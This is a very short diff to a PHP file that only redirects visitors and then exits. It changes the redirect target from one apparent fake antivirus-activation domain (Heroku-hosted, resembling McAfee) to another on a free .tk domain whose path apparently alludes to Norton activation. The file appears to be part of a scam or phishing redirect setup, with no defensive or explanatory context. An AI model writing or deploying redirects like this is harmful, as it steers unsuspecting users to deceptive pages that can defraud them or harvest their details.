@@ -1,4 +1,4 @@
 <?php
-header("Location: https://mcafactt.herokuapp.com/");
+header("Location: https://codeactivateo.tk/actnor/");
 die();
 ?>
